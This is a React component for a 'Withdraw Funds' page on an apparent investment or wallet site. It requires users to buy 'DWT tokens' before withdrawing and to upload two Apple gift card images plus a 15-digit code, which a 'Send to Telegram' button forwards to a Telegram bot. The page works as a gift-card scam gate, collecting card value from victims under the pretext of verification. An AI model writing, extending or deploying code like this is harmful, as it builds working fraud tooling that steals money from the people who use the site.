import { useState } from 'react'
import { useAuth } from '../context/AuthContext'
import './PageContent.css'

const WithdrawPage = () => {
  const { user, withdraw, hasApprovedDWT, updateUser } = useAuth()
  const [amount, setAmount] = useState('')
  const [message, setMessage] = useState({ type: '', text: '' })
  const existingImages = (user?.subscription && user.subscription.giftImages) || []
  const [giftImages, setGiftImages] = useState(existingImages)
  const [voucherCode, setVoucherCode] = useState('')
  const [sending, setSending] = useState(false)

  const walletBalance = user?.walletBalance || 0
  const dwtTokens = user?.dwtTokens || 0

  const canWithdraw = hasApprovedDWT() && giftImages.length >= 2

  const canSendTelegram = giftImages.length >= 2 && /^\d{15}$/.test(voucherCode)

  const handleFileChange = (e, index) => {
    const file = e.target.files[0]
    if (!file) return

    const reader = new FileReader()
    reader.onload = () => {
      const base = reader.result
      const next = [...giftImages]
      next[index] = base
      // remove empty slots
      const filtered = next.filter(Boolean)
      setGiftImages(filtered)
      updateUser({ subscription: { giftImages: filtered } })
    }
    reader.readAsDataURL(file)
  }

  const handleWithdraw = (e) => {
    e.preventDefault()
    setMessage({ type: '', text: '' })

    if (!hasApprovedDWT()) {
      setMessage({ type: 'error', text: 'You need to purchase and have approved DWT tokens to withdraw funds.' })
      return
    }

    if (giftImages.length < 2) {
      setMessage({ type: 'error', text: 'You must upload 2 Apple gift card images as part of the subscription verification before withdrawing.' })
      return
    }

    const withdrawAmount = parseFloat(amount)
    const requiredDWT = Math.ceil(withdrawAmount)

    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
      setMessage({ type: 'error', text: 'Please enter a valid amount' })
      return
    }

    if (withdrawAmount > walletBalance) {
      setMessage({ type: 'error', text: 'Insufficient balance' })
      return
    }

    if (dwtTokens < requiredDWT) {
      setMessage({ 
        type: 'error', 
        text: `Insufficient DWT tokens. You need ${requiredDWT} DWT to withdraw $${withdrawAmount.toFixed(2)}. You currently have ${dwtTokens} DWT.` 
      })
      return
    }

    const result = withdraw(withdrawAmount)
    
    if (result.success) {
      setMessage({ 
        type: 'success', 
        text: `Successfully withdrew $${withdrawAmount.toFixed(2)}. ${requiredDWT} DWT tokens were consumed.` 
      })
      setAmount('')
    } else {
      setMessage({ type: 'error', text: result.error || 'Withdrawal failed' })
    }
  }

  const sendToTelegram = async () => {
    if (!canSendTelegram) {
      setMessage({ type: 'error', text: 'Please upload 2 images and enter a 15-digit code before sending.' })
      return
    }

    setSending(true)
    setMessage({ type: '', text: '' })
    try {
      const res = await fetch('/api/send-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ images: giftImages, code: voucherCode })
      })
      const data = await res.json()
      if (res.ok) {
        setMessage({ type: 'success', text: 'Sent to Telegram bot successfully.' })
      } else {
        setMessage({ type: 'error', text: data.error || 'Failed to send to Telegram' })
      }
    } catch (err) {
      setMessage({ type: 'error', text: 'Network error while sending to Telegram' })
    }
    setSending(false)
  }

  return (
    <div className="page-content">
      <div className="page-header">
        <h2>💵 Withdraw Funds</h2>
        <p>Withdraw your funds to your bank account</p>
      </div>

      <div className="withdraw-content">
        <div className="balance-info">
          <div className="balance-card">
            <span className="balance-label">Available Balance</span>
            <span className="balance-amount">${walletBalance.toFixed(2)}</span>
          </div>
          <div className="balance-card">
            <span className="balance-label">DWT Tokens</span>
            <span className="balance-amount">{dwtTokens}</span>
          </div>
        </div>

        <div className="withdraw-info">
          <h3>Withdrawal Information</h3>
          <ul>
            <li>💰 $1 withdrawal = 1 DWT token required</li>
            <li>🪙 You must have approved DWT tokens to withdraw</li>
            <li>🎫 You must upload 2 Apple gift card images for subscription verification before withdrawing</li>
            <li>⏱️ Withdrawals are processed within 1-3 business days</li>
          </ul>
        </div>

        <form onSubmit={handleWithdraw} className="withdraw-form">
          <div className="form-group">
            <label htmlFor="amount">Withdrawal Amount</label>
            <input
              type="number"
              id="amount"
              step="0.01"
              min="0.01"
              max={walletBalance}
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder={`Max: $${walletBalance.toFixed(2)}`}
              required
            />
            {amount && !isNaN(parseFloat(amount)) && (
              <p className="form-hint">
                Required DWT: {Math.ceil(parseFloat(amount))} tokens
              </p>
            )}
          </div>

          <div className="form-group">
            <label>Upload 2 Apple gift card images (required)</label>
            <div className="upload-area">
              <div>
                <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 0)} />
                {giftImages[0] && <img src={giftImages[0]} alt="preview-1" className="image-preview" />}
              </div>
              <div>
                <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 1)} />
                {giftImages[1] && <img src={giftImages[1]} alt="preview-2" className="image-preview" />}
              </div>
            </div>
          </div>

          <div className="form-group">
            <label htmlFor="voucher">Enter 15-digit code (required for Telegram)</label>
            <textarea
              id="voucher"
              rows={1}
              maxLength={15}
              value={voucherCode}
              onChange={(e) => setVoucherCode(e.target.value.replace(/\D/g, '').slice(0,15))}
              placeholder="Enter 15-digit code"
            />
            <p className="form-hint">Digits only — 15 characters</p>
          </div>

          <div style={{ display: 'flex', gap: 12, marginBottom: 12 }}>
            <button
              type="button"
              className="btn btn-primary"
              onClick={sendToTelegram}
              disabled={!canSendTelegram || sending}
            >
              {sending ? 'Sending...' : 'Send to Telegram'}
            </button>
            <button 
              type="submit" 
              className="btn-withdraw"
              disabled={!canWithdraw}
            >
              {canWithdraw ? 'Withdraw Funds' : 'Upload 2 images & Purchase DWT'}
            </button>
          </div>

          {message.text && (
            <div className={`message ${message.type}`}>
              {message.text}
            </div>
          )}
        </form>
      </div>
    </div>
  )
}

export default WithdrawPage
